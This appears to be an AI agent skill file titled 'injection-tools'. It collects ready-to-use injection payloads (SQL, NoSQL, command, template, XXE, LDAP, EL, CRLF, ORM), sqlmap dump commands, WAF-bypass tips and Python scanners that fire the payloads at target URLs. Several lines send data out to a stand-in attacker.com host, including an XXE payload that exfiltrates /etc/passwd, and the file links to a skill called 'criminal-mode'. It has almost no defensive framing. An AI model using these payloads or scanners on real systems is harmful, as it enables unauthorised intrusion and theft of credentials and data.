---
name: injection-tools
description: "Injection attacks — SQLi, NoSQLi, CMDi, SSTI, XXE, LDAP, EL, CRLF, ORM. 500+ payloads."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [injection, sqli, nosqli, cmdi, ssti, xxe, ldap, crlf]
    related_skills: [criminal-mode, exploit-tools, bug-classes]
prerequisites:
  commands: [python]
---

# Injection Attack Tools — Full Spectrum

## When to Load This Skill

User requests:
- "injection", "SQLi", "NoSQLi", "CMDi", "SSTI", "XXE", "LDAP injection"

---

## SQL Injection

### Union-Based
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--
```

### Blind (Boolean)
```sql
' AND 1=1--
' AND 1=2--
' AND SUBSTRING(database(),1,1)='a'--
```

### Time-Based
```sql
' AND SLEEP(5)--
' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--
'; WAITFOR DELAY '0:0:5'--
' OR pg_sleep(5)--
```

### OOB
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))--
'; EXEC master..xp_dirtree '\\attacker.com\a'--
```

### sqlmap
```bash
sqlmap -u "URL?param=1" --batch --dbs
sqlmap -u "URL?param=1" --batch -D db -T users --dump
sqlmap -u "URL?param=1" --data="user=a&pass=b" --batch
sqlmap -u "URL?param=1" --tamper=space2comment,between --batch
```

---

## NoSQL Injection

### MongoDB
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": 1}}
{"$where": "sleep(5000)"}
{"username": "admin", "password": {"$regex": "^a"}}
```

### Injection in URL
```
?username[$ne]=null&password[$ne]=null
?username[$regex]=^admin&password[$gt]=
```

---

## Command Injection

### Basic
```bash
; whoami
| whoami
`whoami`
$(whoami)
&& whoami
|| whoami
%0a whoami
%0d%0a whoami
```

### Blind
```bash
; sleep 5
; ping -c 1 $(whoami).attacker.com
```

### Bypass
```bash
{whoami}
cat${IFS}/etc/passwd
c'a't /etc/passwd
a=w;b=h;c=o;$a$b$c
```

---

## SSTI

### Jinja2 (Python)
```python
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig (PHP)
```twig
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("id")}}
```

### Freemarker (Java)
```
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### ERB (Ruby)
```ruby
<%= 7*7 %>
<%= system("id") %>
```

### Smarty (PHP)
```
{7*7}
{php}system('id'){/php}
{system('id')}
```

---

## XXE

### Basic
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Blind OOB
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
  %exfil;
]>
<foo>test</foo>
```

### SSRF
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

---

## LDAP Injection

```ldap
*
*)(&
*)(|(&
admin)(&)
*)(uid=*))(|(uid=*
*)(cn=*
*)(|(cn=*
```

---

## EL Injection

```
${7*7}
#{7*7}
${"".getClass().forName("java.lang.Runtime")}
${pageContext.request.getSession()}
```

---

## CRLF Injection

```
%0d%0a
%0a
%0d
\r\n
\n

URL: /path%0d%0aX-Injected: value
Header: X: value%0d%0aSet-Cookie: evil=1
```

---

## ORM Injection

```python
# Django
User.objects.raw("SELECT * FROM users WHERE id = %s" % id)
User.objects.filter(name__contains="admin' OR '1'='1")

# SQLAlchemy
session.execute("SELECT * FROM users WHERE id = " + id)

# Sequelize
User.findAll({where: {name: {[Op.like]: '%admin%'}}})
```

---

## Python Injection Tools

### SQLi Scanner

```python
import requests

PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "1' UNION SELECT NULL--",
    "1' AND SLEEP(5)--",
]

def scan_sqli(url, param):
    results = []
    for payload in PAYLOADS:
        r = requests.get(f"{url}?{param}={payload}", timeout=10)
        if "error" in r.text.lower() or "syntax" in r.text.lower():
            results.append({'payload': payload, 'vulnerable': True})
    return results
```

### SSTI Fuzzer

```python
SSTI_PAYLOADS = {
    'jinja2': '{{7*7}}',
    'twig': '{{7*7}}',
    'freemarker': '${7*7}',
    'erb': '<%= 7*7 %>',
    'smarty': '{7*7}',
}

def test_ssti(url, param):
    results = []
    for engine, payload in SSTI_PAYLOADS.items():
        r = requests.get(f"{url}?{param}={payload}")
        if '49' in r.text:
            results.append({'engine': engine, 'payload': payload, 'vulnerable': True})
    return results
```

### XXE Tester

```python
XXE_PAYLOAD = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>'''

def test_xxe(url):
    r = requests.post(url, data=XXE_PAYLOAD, headers={'Content-Type': 'application/xml'})
    if 'root:' in r.text:
        return {'vulnerable': True, 'data': r.text}
    return {'vulnerable': False}
```

---

## Output Format

```json
{
  "url": "https://target.com",
  "injection": {
    "type": "SQLi",
    "payload": "' OR '1'='1",
    "vulnerable": true,
    "dbms": "MySQL"
  }
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| WAF blocked | Payload detected | Use tamper/encoding |
| No response | Timeout | Increase timeout |
| Sanitized | Input filtered | Try encoding |
